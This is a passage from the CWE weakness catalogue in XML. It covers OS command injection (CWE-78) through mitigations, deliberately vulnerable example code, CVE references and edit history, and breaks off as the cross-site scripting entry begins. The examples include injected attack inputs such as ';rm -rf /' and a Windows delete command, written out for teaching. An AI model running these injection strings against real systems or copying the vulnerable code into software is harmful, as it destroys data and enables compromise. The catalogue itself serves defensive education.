               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.3">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-28">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If the program to be executed allows arguments to be specified within an input file or from standard input, then consider using that mode to pass arguments instead of the command line.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-27">
               <Phase>Architecture and Design</Phase>
               <Strategy>Parameterization</Strategy>
               <Description>
                  <xhtml:p>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</xhtml:p>
                  <xhtml:p>Some languages offer multiple functions that can be used to invoke commands. Where possible, identify any function that invokes a command shell using a single string, and replace it with a function that requires individual arguments. These functions typically perform appropriate quoting and filtering of arguments. For example, in C, the system() function accepts a string that contains the entire command to be executed, whereas execl(), execve(), and others require an array of strings, one for each argument. In Windows, CreateProcess() only accepts one command at a time. In Perl, if system() is provided with an array of arguments, then it will quote each of the arguments.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When constructing OS command strings, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.</xhtml:p>
                  <xhtml:p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing OS command injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent OS command injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, when invoking a mail program, you might need to allow the subject field to contain otherwise-dangerous inputs like ";" and "&gt;" characters, which would need to be escaped or otherwise handled. In this case, stripping the character might reduce the risk of OS command injection, but it would produce incorrect behavior because the subject field would not be recorded as the user intended. This might seem to be a minor inconvenience, but it could be more important when the program relies on well-structured subject lines in order to pass messages to other components.</xhtml:p>
                  <xhtml:p>Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-32">
               <Phase>Operation</Phase>
               <Strategy>Compilation or Build Hardening</Strategy>
               <Description>Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-32">
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-39">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success.</xhtml:p>
                  <xhtml:p>If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not.</xhtml:p>
                  <xhtml:p>In the context of OS Command Injection, error information passed back to the user might reveal whether an OS command is being executed and possibly which command is being used.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>Use runtime policy enforcement to create a whitelist of allowable commands, then prevent use of any command that does not appear in the whitelist. Technologies such as AppArmor are available to do this.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This example code intends to take the name of a user and list the contents of that user's home directory. It is subject to the first variant of OS command injection.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$userName = $_POST["user"];<xhtml:br/>$command = 'ls -l /home/' . $userName;<xhtml:br/>system($command);</xhtml:div>
               </Example_Code>
               <Body_Text>The $userName variable is not checked for malicious input. An attacker could set the $userName variable to an arbitrary OS command such as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>;rm -rf /</xhtml:div>
               </Example_Code>
               <Body_Text>Which would result in $command being:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>ls -l /home/;rm -rf /</xhtml:div>
               </Example_Code>
               <Body_Text>Since the semi-colon is a command separator in Unix, the OS would first execute the ls command, then the rm command, deleting the entire file system.</Body_Text>
               <Body_Text>Also note that this example code is vulnerable to Path Traversal (CWE-22) and Untrusted Search Path (CWE-426) attacks.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example is a web application that intends to perform a DNS lookup of a user-supplied domain name. It is subject to the first variant of OS command injection.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>use CGI qw(:standard);<xhtml:br/>$name = param('name');<xhtml:br/>$nslookup = "/path/to/nslookup";<xhtml:br/>print header;<xhtml:br/>if (open($fh, "$nslookup $name|")) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>while (&lt;$fh&gt;) {<xhtml:div style="margin-left:10px;">
                              <xhtml:div>print escapeHTML($_);<xhtml:br/>print "&lt;br&gt;\n";</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>}<xhtml:br/>close($fh);</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>Suppose an attacker provides a domain name like this:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>cwe.mitre.org%20%3B%20/bin/ls%20-l</xhtml:div>
               </Example_Code>
               <Body_Text>The "%3B" sequence decodes to the ";" character, and the %20 decodes to a space. The open() statement would then process a string like this:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>/path/to/nslookup cwe.mitre.org ; /bin/ls -l</xhtml:div>
               </Example_Code>
               <Body_Text>As a result, the attacker executes the "/bin/ls -l" command and gets a list of all the files in the program's working directory. The input could be replaced with much more dangerous commands, such as installing a malicious program on the server.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The example below reads the name of a shell script to execute from the system properties. It is subject to the second variant of OS command injection.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>String script = System.getProperty("SCRIPTNAME");<xhtml:br/>if (script != null)<xhtml:div style="margin-left:10px;">
                        <xhtml:div>System.exec(script);</xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>If an attacker has control over this property, then they could modify the property to point to a dangerous program.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the example below, a method is used to transform geographic coordinates from latitude and longitude format to UTM format. The method gets the input coordinates from a user through a HTTP request and executes a program local to the application server that performs the transformation. The method passes the latitude and longitude coordinates as a command-line option to the external program and will perform some processing to retrieve the results of the transformation and return the resulting UTM coordinates.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>public String coordinateTransformLatLonToUTM(String coordinates)<xhtml:br/>{<xhtml:div style="margin-left:10px;">
                        <xhtml:div>String utmCoords = null;<xhtml:br/>try {<xhtml:div style="margin-left:10px;">
                              <xhtml:div>String latlonCoords = coordinates;<xhtml:br/>Runtime rt = Runtime.getRuntime();<xhtml:br/>Process exec = rt.exec("cmd.exe /C latlon2utm.exe -" + latlonCoords);<xhtml:div>
                                    <xhtml:i>// process results of coordinate transform</xhtml:i>
                                 </xhtml:div>
                                 <xhtml:div>
                                    <xhtml:i>// ...</xhtml:i>
                                 </xhtml:div>
                              </xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>}<xhtml:br/>catch(Exception e) {...}<xhtml:br/>return utmCoords;</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, the method does not verify that the contents of the coordinates input parameter includes only correctly-formatted latitude and longitude coordinates. If the input coordinates were not validated prior to the call to this method, a malicious user could execute another program local to the application server by appending '&amp;' followed by the command for another program to the end of the coordinate string. The '&amp;' instructs the Windows operating system to execute another program.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-28">
               <Intro_Text>The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>String btype = request.getParameter("backuptype");<xhtml:br/>String cmd = new String("cmd.exe /K \"<xhtml:div style="margin-left:10px;">
                        <xhtml:div>c:\\util\\rmanDB.bat "<xhtml:br/>+btype+<xhtml:br/>"&amp;&amp;c:\\utl\\cleanup.bat\"")</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>System.Runtime.getRuntime().exec(cmd);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form "&amp; del c:\\dbms\\*.*", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-1999-0067</Reference>
               <Description>Canonical example. CGI program does not neutralize "|" metacharacter when invoking a phonebook program.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0067</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1246</Reference>
               <Description>Language interpreter's mail function accepts another argument that is concatenated to a string used in a dangerous popen() call. Since there is no neutralization of this argument, both OS Command Injection (CWE-78) and Argument Injection (CWE-88) are possible.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1246</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0061</Reference>
               <Description>Web server allows command execution using "|" (pipe) character.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0061</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0041</Reference>
               <Description>FTP client does not filter "|" from filenames returned by the server, allowing for OS command injection.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0041</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2575</Reference>
               <Description>Shell metacharacters in a filename in a ZIP archive</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2575</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1898</Reference>
               <Description>Shell metacharacters in a telnet:// link are not properly handled when the launching application processes the link.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1898</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4304</Reference>
               <Description>OS command injection through environment variable.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4304</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4796</Reference>
               <Description>OS command injection through https:// URLs</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4796</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-3572</Reference>
               <Description>Chain: incomplete blacklist for OS command injection</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3572</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-1988</Reference>
               <Description>Product allows remote users to execute arbitrary commands by creating a file whose pathname contains shell metacharacters.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1988</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Program Invocation</Functional_Area>
         </Functional_Areas>
         <Affected_Resources>
            <Affected_Resource>System Process</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>OS Command Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Malicious File Execution</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ENV03-C</Entry_ID>
               <Entry_Name>Sanitize the environment when invoking external programs</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ENV33-C</Entry_ID>
               <Entry_Name>Do not call system()</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>STR02-C</Entry_ID>
               <Entry_Name>Sanitize data passed to complex subsystems</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>31</Entry_ID>
               <Entry_Name>OS Commanding</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT Java Secure Coding">
               <Entry_ID>IDS07-J</Entry_ID>
               <Entry_Name>Do not pass untrusted, unsanitized data to the Runtime.exec() method</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="108"/>
            <Related_Attack_Pattern CAPEC_ID="15"/>
            <Related_Attack_Pattern CAPEC_ID="43"/>
            <Related_Attack_Pattern CAPEC_ID="6"/>
            <Related_Attack_Pattern CAPEC_ID="88"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-140"/>
            <Reference External_Reference_ID="REF-685"/>
            <Reference External_Reference_ID="REF-686"/>
            <Reference External_Reference_ID="REF-687" Section="chapter: &#34;CGI Scripts&#34;"/>
            <Reference External_Reference_ID="REF-688"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 10: Command Injection.&#34; Page 171"/>
            <Reference External_Reference_ID="REF-690"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 8, &#34;Shell Metacharacters&#34;, Page 425."/>
         </References>
         <Notes>
            <Note Type="Terminology">The "OS command injection" phrase carries different meanings to different people. For some people, it only refers to cases in which the attacker injects command separators into arguments for an application-controlled program that is being invoked. For some people, it refers to any type of attack that can allow the attacker to execute OS commands of their own choosing. This usage could include untrusted search path weaknesses (CWE-426) that cause the application to find and execute an attacker-controlled program. Further complicating the issue is the case when argument injection (CWE-88) allows alternate command-line switches or options to be inserted into the command line, such as an "-exec" switch whose purpose may be to execute the subsequent argument as a command (this -exec switch exists in the UNIX "find" command, for example). In this latter case, however, CWE-88 could be regarded as the primary weakness in a chain with CWE-78.</Note>
            <Note Type="Research Gap">More investigation is needed into the distinction between the OS command injection variants, including the role with argument injection (CWE-88). Equivalent distinctions may exist in other injection-related problems such as SQL injection.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>KDM Analytics</Modification_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Name, Observed_Examples, Other_Notes, Potential_Mitigations, Relationships, Research_Gaps, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>KDM Analytics</Modification_Name>
               <Modification_Date>2009-07-17</Modification_Date>
               <Modification_Comment>Improved the White_Box_Definition</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description, Name, White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Detection_Factors, Name, Observed_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships, Taxonomy_Mappings, White_Box_Definitions</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2008-04-11">OS Command Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Failure to Sanitize Data into an OS Command (aka 'OS Command Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Preserve OS Command Structure (aka 'OS Command Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-07-27">Failure to Preserve OS Command Structure ('OS Command Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Improper Sanitization of Special Elements used in an OS Command ('OS Command Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="79" Name="Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')" Abstraction="Base" Structure="Simple" Status="Usable">
         <Description>The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.</Description>
         <Extended_Description>
            <xhtml:p>Cross-site scripting (XSS) vulnerabilities occur when:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:div>1. Untrusted data enters a web application, typically from a web request.</xhtml:div>
               <xhtml:div>2. The web application dynamically generates a web page that contains this untrusted data.</xhtml:div>
               <xhtml:div>3. During page generation, the application does not prevent the data from containing content that is executable by a web browser, such as JavaScript, HTML tags, HTML attributes, mouse events, Flash, ActiveX, etc.</xhtml:div>
               <xhtml:div>4. A victim visits the generated web page through a web browser, which contains malicious script that was injected using the untrusted data.</xhtml:div>
               <xhtml:div>5. Since the script comes from a web page that was sent by the web server, the victim's web browser executes the malicious script in the context of the web server's domain.</xhtml:div>
               <xhtml:div>6. This effectively violates the intention of the web browser's same-origin policy, which states that scripts in one domain should not be able to access resources or run code in a different domain.</xhtml:div>
            </xhtml:div>
            <xhtml:p>There are three main kinds of XSS:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:div style="color:#32498D; font-weight:bold;">Type 1: Reflected XSS (or Non-Persistent)</xhtml:div>
